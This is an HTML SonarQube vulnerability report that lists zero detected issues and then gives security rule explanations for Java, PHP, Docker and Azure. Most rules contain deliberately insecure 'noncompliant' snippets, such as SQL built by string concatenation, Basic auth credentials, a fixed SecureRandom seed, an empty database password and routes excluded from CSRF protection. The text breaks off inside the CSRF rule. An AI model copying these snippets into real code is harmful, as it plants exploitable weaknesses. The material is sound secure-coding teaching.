<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>SonarQube Vulnerability Report</title>
  <style>
    /*
	The sss stylesheet is released under the MIT license.
	<https://github.com/Thiht/sss>
	*/
    pre,
td,
th {
    padding: 5px 10px
}

code,
hr,
pre,
thead {
    background: #EEE
}

body {
    color: #333;
    font-family: 'Segoe UI', 'Lucida Grande', Helvetica, sans-serif;
    line-height: 1.5;
}

div.summup {
    max-width: 800px;
    margin: 50px auto;
}

div.detail {
    padding: 20px;
}

h1,
h2,
h3,
h4,
h5,
h6 {
    font-weight: 400;
    line-height: 1em;
    margin: 20px 0
}

h1 {
    font-size: 2.25em
}

h2 {
    font-size: 1.75em
}

h3 {
    font-size: 1.5em
}

h4,
h5,
h6 {
    font-size: 1.25em
}

a {
    color: #08C;
    text-decoration: none
}

a:focus,
a:hover {
    text-decoration: underline
}

a:visited {
    color: #058
}

img {
    max-width: 100%
}

li+li {
    margin-top: 3px
}

dt {
    font-weight: 700
}

code {
    font-family: Consolas, "Lucida Console", monospace;
    padding: 1px 5px
}

pre {
    white-space: pre-wrap
}

pre code {
    padding: 0
}

blockquote {
    border-left: 5px solid #EEE;
    margin: 0;
    padding: 0 10px
}

table {
    border-collapse: collapse;
    width: 100%
}

table+table {
    margin-top: 1em
}

thead {
    text-align: left
}

td,
th {
    border: 1px solid #EEE
}

td.component {
    word-break: break-all;
}

hr {
    border: 0;
    height: 1px
}

.banner {
    text-align: center;
}

canvas {
    display: block;
    margin: 10px auto;
}

.statusOK {
    background-color: #0a0
}

.statusERROR {
    background-color: #d4333f
}

.sevHIGH {
    background-color: #d43223
}

.sevMEDIUM {
    background-color: #f39c12
}

.sevLOW {
    background-color: #319ddb
}

.hidden {
    display: none;
}

.rulestable {
    table-layout: fixed;
    word-wrap: break-word
}
  </style>
</head>

<body>
  <div class="summup">
    <!-- insert your company banner here -->
    <!--
		<p class="banner">
			<a href="https://www.soprasteria.com/" target="_blank">
				<img src="https://upload.wikimedia.org/wikipedia/en/thumb/0/02/Sopra_Steria_logo.svg/1280px-Sopra_Steria_logo.svg.png" alt="Sopra Steria" height="50">
			</a>
		</p>
		-->

    <h1>SonarQube Vulnerability Report</h1>

    <dl>
      <dt>Report Generated On</dt>
      <dd>
        Thursday, Apr 25, 2024
      </dd>

      <dt>Project Name/URL</dt>
      <dd>
        <a href="https://sonarcloud.io/dashboard?id=soprasteria_sonar-report" target="_blank">
          Sonar Report
        </a>
      </dd>

      <dt>Application</dt>
      <dd>
        sonar-report
      </dd>

      <dt>Release</dt>
      <dd>
        1.0.0
      </dd>

      <dt>Branch</dt>
      <dd>
        master
      </dd>

      <dt>Delta Analysis</dt>
      <dd>
        No
      </dd>

      

      
    </dl>

    

    <h2>Summary of the Detected Vulnerabilities
    </h2>
    <table>
      <thead>
        <tr>
          <th></th>
          <th>Severity</th>
          <th>Number of Issues</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td class="sevHIGH"></td>
          <td>HIGH</td>
          <td>
            0
          </td>
        </tr>
        <tr>
          <td class="sevMEDIUM"></td>
          <td>MEDIUM</td>
          <td>
            0
          </td>
        </tr>
        <tr>
          <td class="sevLOW"></td>
          <td>LOW</td>
          <td>
            0
          </td>
        </tr>
      </tbody>
    </table>

    
  </div>

  <div class=detail>
    

    
    <h3>Known Security Rules</h3>
    <table class="rulestable">
      <thead>
        <tr>
          <th>Rule</th>
          <th>Description</th>
        </tr>
      </thead>
      <tbody>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2647">
              java:S2647
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Basic authentication is a vulnerable method of user authentication that should be avoided. It functions by transmitting a Base64 encoded username
and password. As Base64 is easy to recognize and reverse, sensitive data may be leaked this way.</p>
<h2>Why is this an issue?</h2>
<p>Basic authentication is a simple and widely used method of user authentication for HTTP requests. When a client sends a request to a server that
requires authentication, the client includes the username and password (concatenated together and Base64 encoded) in the "Authorization" header of the
HTTP request. The server verifies the credentials and grants access if they are valid. Every request sent to the server to a protected endpoint must
include these credentials.</p>
<p>Basic authentication is considered insecure for several reasons:</p>
<ul>
  <li> It transmits user credentials in plain text, making them susceptible to interception and eavesdropping. </li>
  <li> It relies solely on the server’s ability to verify the provided credentials. There is no mechanism for additional security measures like
  multi-factor authentication or account lockouts after multiple failed login attempts. </li>
  <li> It does not provide a way to manage user sessions securely. The client typically includes the credentials in every request, which creates more
  opportunities for an attacker to steal these credentials. </li>
</ul>
<p>These security limitations make basic authentication an insecure choice for authentication or authorization over HTTP.</p>
<h3>What is the potential impact?</h3>
<p>Basic authentication transmits passwords in plain text, which makes it vulnerable to interception by attackers.</p>
<h4>Session hijacking and man-in-the-middle attack</h4>
<p>If an attacker gains access to the network traffic, they can easily capture the username and password. Basic authentication does not provide any
mechanism to protect against session hijacking attacks. Once a user is authenticated, the session identifier (the username and password) is sent in
clear text with each subsequent request. If attackers can intercept one request, they can use it to impersonate the authenticated user, gaining
unauthorized access to their account and potentially performing malicious actions.</p>
<h4>Brute-force attacks</h4>
<p>Basic authentication does not have any built-in protection against brute-force attacks. Attackers can repeatedly guess passwords until they find
the correct one, especially if weak or commonly used passwords are used. This can lead to unauthorized access to user accounts and potential data
breaches.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code uses basic authentication to send out an HTTP request to a protected endpoint.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="101" data-diff-type="noncompliant">
String encoded = Base64.getEncoder().encodeToString("login:passwd".getBytes());
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
conn.setRequestMethod("POST");
conn.setDoOutput(true);
conn.setRequestProperty("Authorization", "Basic " + encoded); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="101" data-diff-type="compliant">
// An access token should be retrieved before the HTTP request
String accessToken = System.getenv("ACCESS_TOKEN");
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
conn.setRequestMethod("POST");
conn.setDoOutput(true);
conn.setRequestProperty("Authorization", "Bearer " + accessToken);
</pre>
<h3>How does this work?</h3>
<h4>Token-based authentication and OAuth</h4>
<p>Token-based authentication is a safer alternative than basic authentication. A unique token is generated upon successful authentication and sent to
the client, which is then included in subsequent requests. Therefore, it eliminates the need to transmit sensitive credentials with each request.
OAuth also works by authenticating users via tokens. It gives even more flexibility on top of this by offering scopes, which limit an application’s
access to a user’s account.</p>
<p>Additionally, both token-based authentication and OAuth support mechanisms for token expiration, revocation, and refresh. This gives more
flexibility than basic authentication, as compromised tokens carry much less risk than a compromised password.</p>
<h4>SSL encryption for HTTP requests</h4>
<p>With basic authentication, user credentials are transmitted in plain text, which makes them vulnerable to interception and eavesdropping. However,
when HTTPS is employed, the data is encrypted before transmission, making it significantly more difficult for attackers to intercept and decipher the
credentials. If no other form of authentication is possible for this code, then every request must be sent over HTTPS to ensure credentials are kept
safe.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> MDN web docs - <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication">HTTP authentication</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html#user-authentication">OWASP Web Service Security
  Cheat Sheet</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/522">CWE-522 - Insufficiently Protected Credentials</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2077">
              java:S2077
            </a>
          </td>
          <td>
            <details>
              <p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the
query. However, this rule doesn’t detect SQL injections (unlike rule <a href='/organizations/sopra-steria/rules?open=javasecurity%3AS3649&rule_key=javasecurity%3AS3649'>S3649</a>), the goal is only to highlight complex/formatted queries.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Some parts of the query come from untrusted values (like user inputs). </li>
  <li> The query is repeated/duplicated in other parts of the code. </li>
  <li> The application must support different types of relational databases. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use <a href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html">parameterized queries, prepared
  statements, or stored procedures</a> and bind variables to SQL query parameters. </li>
  <li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
public User getUser(Connection con, String user) throws SQLException {

  Statement stmt1 = null;
  Statement stmt2 = null;
  PreparedStatement pstmt;
  try {
    stmt1 = con.createStatement();
    ResultSet rs1 = stmt1.executeQuery("GETDATE()"); // No issue; hardcoded query

    stmt2 = con.createStatement();
    ResultSet rs2 = stmt2.executeQuery("select FNAME, LNAME, SSN " +
                 "from USERS where UNAME=" + user);  // Sensitive

    pstmt = con.prepareStatement("select FNAME, LNAME, SSN " +
                 "from USERS where UNAME=" + user);  // Sensitive
    ResultSet rs3 = pstmt.executeQuery();

    //...
}

public User getUserHibernate(org.hibernate.Session session, String data) {

  org.hibernate.Query query = session.createQuery(
            "FROM students where fname = " + data);  // Sensitive
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public User getUser(Connection con, String user) throws SQLException {

  Statement stmt1 = null;
  PreparedStatement pstmt = null;
  String query = "select FNAME, LNAME, SSN " +
                 "from USERS where UNAME=?"
  try {
    stmt1 = con.createStatement();
    ResultSet rs1 = stmt1.executeQuery("GETDATE()");

    pstmt = con.prepareStatement(query);
    pstmt.setString(1, user);  // Good; PreparedStatements escape their inputs.
    ResultSet rs2 = pstmt.executeQuery();

    //...
  }
}

public User getUserHibernate(org.hibernate.Session session, String data) {

  org.hibernate.Query query =  session.createQuery("FROM students where fname = ?");
  query = query.setParameter(0,data);  // Good; Parameter binding escapes all input

  org.hibernate.Query query2 =  session.createQuery("FROM students where fname = " + data); // Sensitive
  // ...
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/89">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/564">CWE-564 - SQL Injection: Hibernate</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/943">CWE-943 - Improper Neutralization of Special Elements in Data Query Logic</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/ITdGBQ">CERT, IDS00-J.</a> - Prevent SQL injection </li>
  <li> Derived from FindSecBugs rules <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA">Potential SQL/JPQL Injection
  (JPA)</a>, <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO">Potential SQL/JDOQL Injection (JDO)</a>, <a
  href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE">Potential SQL/HQL Injection (Hibernate)</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4347">
              java:S4347
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic operations often rely on unpredictable random numbers to enhance security. These random numbers are created by cryptographically
secure pseudo-random number generators (CSPRNG). It is important not to use a predictable seed with these random number generators otherwise the
random numbers will also become predictable.</p>
<h2>Why is this an issue?</h2>
<p>Random number generators are often used to generate random values for cryptographic algorithms. When a random number generator is used for
cryptographic purposes, the generated numbers must be as random and unpredictable as possible. When the random number generator is improperly seeded
with a constant or a predictable value, its output will also be predictable.</p>
<p>This can have severe security implications for cryptographic operations that rely on the randomness of the generated numbers. By using a
predictable seed, an attacker can potentially guess or deduce the generated numbers, compromising the security of whatever cryptographic algorithm
relies on the random number generator.</p>
<h3>What is the potential impact?</h3>
<p>It is crucial to understand that the strength of cryptographic algorithms heavily relies on the quality of the random numbers used. By improperly
seeding a CSPRNG, we introduce a significant weakness that can be exploited by attackers.</p>
<h4>Insecure cryptographic keys</h4>
<p>One of the primary use cases for CSPRNGs is generating cryptographic keys. If an attacker can predict the seed used to initialize the random number
generator, they may be able to derive the same keys. Depending on the use case, this can lead to multiple severe outcomes, such as:</p>
<ul>
  <li> Being able to decrypt sensitive documents, leading to privacy breaches or identity theft. </li>
  <li> Gaining access to a private key used for signing, allowing an attacker to forge digital signatures and impersonate legitimate entities. </li>
  <li> Bypassing authentication mechanisms that rely on public-key infrastructure (PKI), which can be abused to gain unauthorized access to systems or
  networks. </li>
</ul>
<h4>Session hijacking and man-in-the-middle attack</h4>
<p>Another scenario where this vulnerability can be exploited is in the generation of session tokens or nonces for secure communication protocols. If
an attacker can predict the seed used to generate these tokens, they can impersonate legitimate users or intercept sensitive information.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code uses a cryptographically strong random number generator to generate data that is not cryptographically strong.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
SecureRandom sr = new SecureRandom();
sr.setSeed(123456L); // Noncompliant
int v = sr.next(32);
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
SecureRandom sr = new SecureRandom("abcdefghijklmnop".getBytes("us-ascii")); // Noncompliant
int v = sr.next(32);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
SecureRandom sr = new SecureRandom();
int v = sr.next(32);
</pre>
<p>This solution is available for JDK 1.8 and higher.</p>
<pre data-diff-id="2" data-diff-type="compliant">
SecureRandom sr = SecureRandom.getInstanceStrong();
int v = sr.next(32);
</pre>
<h3>How does this work?</h3>
<p>When the randomly generated data needs to be cryptographically strong, <code>SecureRandom</code> is the correct class to use. However, its
documentation also cites that "any seed material passed to a <code>SecureRandom</code> object must be unpredictable". When no seed is passed by the
user to the object, the <code>SecureRandom</code> object chooses an unpredictable seed by default. Therefore, the easiest way to fix the issue is to
use the default constructor without any calls to <code>SecureObject.setSeed()</code>.</p>
<p>To go the extra mile, <code>SecureObject.getInstanceStrong()</code> returns an instance of <code>SecureObject</code> that is guaranteed to use a
strong algorithm for its number generation.</p>
<p>If the randomly generated data is not used for cryptographic purposes and is not business critical, it may be a better choice to use
<code>java.util.Random</code> instead. In this case, setting a predictable seed may be acceptable depending on the situation.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Java Documentation - <a href="https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/security/SecureRandom.html">Class
  <code>java.security.SecureRandom</code></a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/330">CWE-330 - Use of Insufficiently Random Values</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/332">CWE-332 - Insufficient Entropy in PRNG</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/336">CWE-336 - Same Seed in Pseudo-Random Number Generator (PRNG)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/337">CWE-337 - Predictable Seed in Pseudo-Random Number Generator (PRNG)</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/MSC63-J.+Ensure+that+SecureRandom+is+properly+seeded">CERT, MSC63J.</a> - Ensure that
  SecureRandom is properly seeded </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6504">
              docker:S6504
            </a>
          </td>
          <td>
            <details>
              <p>Ownership or write permissions for a file or directory copied to the Docker image have been assigned to a user other than root.</p>
<p>Write permissions enable malicious actors, who have a foothold on the container, to tamper with the resource and thus potentially manipulate the
container’s expected behavior.<br> Manipulating files could disrupt services or aid in escalating privileges inside the container.<br></p>
<p>This also breaches the container immutability principle as it facilitates container changes during its life. Immutability, a container best
practice, allows for a more reliable and reproducible behavior of Docker containers.</p>
<p>If a user is given ownership on a file but no write permissions, the user can still modify it by using his ownership to change the file permissions
first. This is why both ownership and write permissions should be avoided.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> A non-root user owns the resource. </li>
  <li> A non-root user has been granted write permissions for the resource. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use <code>--chmod</code> to change the permissions so that only root users can write to files. </li>
  <li> Use <code>--chown</code> to change the file/directory owner to a root user. </li>
  <li> Be mindful of the container immutability principle. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre data-diff-id="1" data-diff-type="noncompliant">
FROM example

RUN useradd exampleuser
# Sensitive
COPY --chown=exampleuser:exampleuser src.py dst.py
</pre>
<h2>Compliant Solution</h2>
<pre data-diff-id="1" data-diff-type="compliant">
FROM example

COPY --chown=root:root --chmod=755 src.py dst.py
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.docker.com/engine/reference/builder/#add">Dockerfile reference</a> - ADD instruction </li>
  <li> <a href="https://docs.docker.com/engine/reference/builder/#copy">Dockerfile reference</a> - COPY instruction </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> <a href="https://cloud.google.com/architecture/best-practices-for-operating-containers#immutability">Google Cloud, Immutability</a> - Best
  practices for operating containers </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6497">
              docker:S6497
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=docker%3AS6596&rule_key=docker%3AS6596'>S6596</a> instead.</p>
<p>A container image digest uniquely and immutably identifies a container image. A tag, on the other hand, is a mutable reference to a container
image.</p>
<p>This tag can be updated to point to another version of the container at any point in time.<br> In general, the use of image digests instead of tags
is intended to keep determinism stable within a system or infrastructure for reliability reasons.</p>
<p>The problem is that pulling such an image prevents the resulting container from being updated or patched in order to remove vulnerabilities or
significant bugs.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> You expect to receive security updates of the base image. </li>
</ul>
<p>There is a risk if you answer yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Containers should get the latest security updates. If there is a need for determinism, the solution is to find tags that are not as prone to change
as <code>latest</code> or <a href="https://github.com/docker-library/faq#whats-the-difference-between-shared-and-simple-tags">shared tags</a>.</p>
<p>To do so, favor a more precise tag that uses <a href="https://semver.org/">semantic versioning</a> and target a major version, for example.</p>
<h2>Sensitive Code Example</h2>
<pre>
FROM mongo@sha256:8eb8f46e22f5ccf1feb7f0831d02032b187781b178cb971cd1222556a6cee9d1

RUN echo ls
</pre>
<h2>Compliant Solution</h2>
<p>Here, mongo:6.0 is better than using a digest, and better than using a more precise version, such as 6.0.4, because it would prevent 6.0.5 security
updates:</p>
<pre>
FROM mongo:6.0

RUN echo ls
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://github.com/safe-waters/docker-lock">Docker-Lock</a> </li>
  <li> <a
  href="https://cloud.google.com/kubernetes-engine/docs/archive/using-container-image-digests-in-kubernetes-manifests#recommendations">Skaffold, kpt,
  digester, kustomize, gke-deploy, ko, and Bazel</a> </li>
  <li> <a href="https://cloud.google.com/kubernetes-engine/docs/archive/using-container-images">GKE, Using Container Image Digests</a> </li>
  <li> <a href="https://docs.openshift.com/container-platform/3.11/architecture/core_concepts/builds_and_image_streams.html#image-streams">OpenShift,
  Builds and Image Streams</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6378">
              azureresourcemanager:S6378
            </a>
          </td>
          <td>
            <details>
              <p>Disabling Managed Identities can reduce an organization’s ability to protect itself against configuration faults and credential leaks.</p>
<p>Authenticating via managed identities to an Azure resource solely relies on an API call with a non-secret token. The process is inner to Azure:
secrets used by Azure are not even accessible to end-users.</p>
<p>In typical scenarios without managed identities, the use of credentials can lead to mistakenly leaving them in code bases. In addition,
configuration faults may also happen when storing these values or assigning them permissions.</p>
<p>By transparently taking care of the Azure Active Directory authentication, Managed Identities allow getting rid of day-to-day credentials
management.</p>
<h2>Ask Yourself Whether</h2>
<p>The resource:</p>
<ul>
  <li> Needs to authenticate to Azure resources that support Azure Active Directory (AAD). </li>
  <li> Uses a different Access Control system that doesn’t guarantee the same security controls as AAD, or no Access Control system at all. </li>
</ul>
<p>There is a risk if you answered yes to all of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable the Managed Identities capabilities of this Azure resource. If supported, use a System-Assigned managed identity, as:</p>
<ul>
  <li> It cannot be shared across resources. </li>
  <li> Its life cycle is deeply tied to the life cycle of its Azure resource. </li>
  <li> It provides a unique independent identity. </li>
</ul>
<p>Alternatively, User-Assigned Managed Identities can also be used but don’t guarantee the properties listed above.</p>
<h2>Sensitive Code Example</h2>
<p>Using ARM templates:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "resources": [
        {
            "type": "Microsoft.ApiManagement/service",
            "apiVersion": "2022-09-01-preview",
            "name": "apiManagementService"
        }
    ]
}
</pre>
<p>Using Bicep:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
resource sensitiveApiManagementService 'Microsoft.ApiManagement/service@2022-09-01-preview' = {
  name: 'apiManagementService'
  // Sensitive: no Managed Identity is defined
}
</pre>
<h2>Compliant Solution</h2>
<p>Using ARM templates:</p>
<pre data-diff-id="1" data-diff-type="compliant">
{
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "resources": [
        {
            "type": "Microsoft.ApiManagement/service",
            "apiVersion": "2022-09-01-preview",
            "name": "apiManagementService",
            "identity": {
                "type": "SystemAssigned"
            }
        }
    ]
}
</pre>
<p>Using Bicep:</p>
<pre data-diff-id="2" data-diff-type="compliant">
resource sensitiveApiManagementService 'Microsoft.ApiManagement/service@2022-09-01-preview' = {
  name: 'apiManagementService'
  identity: {
    type: 'SystemAssigned'
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview">Azure AD Documentation - Managed
  Identities Overview</a> </li>
  <li> <a
  href="https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/managed-identity-best-practice-recommendations">Azure AD Documentation - Managed Identities Best Practices</a> </li>
  <li> <a href="https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/services-support-managed-identities">Azure
  AD Documentation - Services that support managed identities</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2115">
              php:S2115
            </a>
          </td>
          <td>
            <details>
              <p>When accessing a database, an empty password should be avoided as it introduces a weakness.</p>
<h2>Why is this an issue?</h2>
<p>When a database does not require a password for authentication, it allows anyone to access and manipulate the data stored within it. Exploiting
this vulnerability typically involves identifying the target database and establishing a connection to it without the need for any authentication
credentials.</p>
<h3>What is the potential impact?</h3>
<p>Once connected, an attacker can perform various malicious actions, such as viewing, modifying, or deleting sensitive information, potentially
leading to data breaches or unauthorized access to critical systems. It is crucial to address this vulnerability promptly to ensure the security and
integrity of the database and the data it contains.</p>
<h4>Unauthorized Access to Sensitive Data</h4>
<p>When a database lacks a password for authentication, it opens the door for unauthorized individuals to gain access to sensitive data. This can
include personally identifiable information (PII), financial records, intellectual property, or any other confidential information stored in the
database. Without proper access controls in place, malicious actors can exploit this vulnerability to retrieve sensitive data, potentially leading to
identity theft, financial loss, or reputational damage.</p>
<h4>Compromise of System Integrity</h4>
<p>Without a password requirement, unauthorized individuals can gain unrestricted access to a database, potentially compromising the integrity of the
entire system. Attackers can inject malicious code, alter configurations, or manipulate data within the database, leading to system malfunctions,
unauthorized system access, or even complete system compromise. This can disrupt business operations, cause financial losses, and expose the
organization to further security risks.</p>
<h4>Unwanted Modifications or Deletions</h4>
<p>The absence of a password for database access allows anyone to make modifications or deletions to the data stored within it. This poses a
significant risk, as unauthorized changes can lead to data corruption, loss of critical information, or the introduction of malicious content. For
example, an attacker could modify financial records, tamper with customer orders, or delete important files, causing severe disruptions to business
processes and potentially leading to financial and legal consequences.</p>
<p>Overall, the lack of a password configured to access a database poses a serious security risk, enabling unauthorized access, data breaches, system
compromise, and unwanted modifications or deletions. It is essential to address this vulnerability promptly to safeguard sensitive data, maintain
system integrity, and protect the organization from potential harm.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code uses an empty password to connect to a MySQL database.</p>
<p>The vulnerability can be fixed by using a strong password retrieved from an environment variable <code>MYSQL_SECURE_PASSWORD</code>. This
environment variable is set during deployment. It should be strong and different for each database.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="401" data-diff-type="noncompliant">
$conn = new mysqli($servername, $username, ""); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="401" data-diff-type="compliant">
$password = getenv('MYSQL_SECURE_PASSWORD');
$conn = new mysqli($servername, $username, $password);
</pre>
<h3>Pitfalls</h3>
<h4>Hard-coded passwords</h4>
<p>It could be tempting to replace the empty password with a hard-coded one. Hard-coding passwords in the code can pose significant security risks.
Here are a few reasons why it is not recommended:</p>
<ol>
  <li> Security Vulnerability: Hard-coded passwords can be easily discovered by anyone who has access to the code, such as other developers or
  attackers. This can lead to unauthorized access to the database and potential data breaches. </li>
  <li> Lack of Flexibility: Hard-coded passwords make it difficult to change the password without modifying the code. If the password needs to be
  updated, it would require recompiling and redeploying the code, which can be time-consuming and error-prone. </li>
  <li> Version Control Issues: Storing passwords in code can lead to version control issues. If the code is shared or stored in a version control
  system, the password will be visible to anyone with access to the repository, which is a security risk. </li>
</ol>
<p>To mitigate these risks, it is recommended to use secure methods for storing and retrieving passwords, such as using environment variables,
configuration files, or secure key management systems. These methods allow for better security, flexibility, and separation of sensitive information
from the codebase.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/521">CWE-521 - Weak Password Requirements</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4502">
              php:S4502
            </a>
          </td>
          <td>
            <details>
              <p>A cross-site request forgery (CSRF) attack occurs when a trusted user of a web application can be forced, by an attacker, to perform sensitive
actions that he didn’t intend, such as updating his profile or sending a message, more generally anything that can change the state of the
application.</p>
<p>The attacker can trick the user/victim to click on a link, corresponding to the privileged action, or to visit a malicious web site that embeds a
hidden web request and as web browsers automatically include cookies, the actions can be authenticated and sensitive.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The web application uses cookies to authenticate users. </li>
  <li> There exist sensitive operations in the web application that can be performed when the user is authenticated. </li>
  <li> The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE requests for example. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Protection against CSRF attacks is strongly recommended:
    <ul>
      <li> to be activated by default for all <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods">unsafe HTTP
      methods</a>. </li>
      <li> implemented, for example, with an unguessable CSRF token </li>
    </ul>  </li>
  <li> Of course all sensitive operations should not be performed with <a
  href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods">safe HTTP</a> methods like <code>GET</code> which are designed to be
  used only for information retrieval. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://laravel.com/docs/8.x/csrf#csrf-excluding-uris">Laravel VerifyCsrfToken middleware</a></p>
<pre>
use Illuminate\Foundation\Http\Middleware\VerifyCsrfToken as Middleware;

class VerifyCsrfToken extends Middleware
{
    protected $except = [
        'api/*'
    ]; // Sensitive; disable CSRF protection for a list of routes
}
</pre>
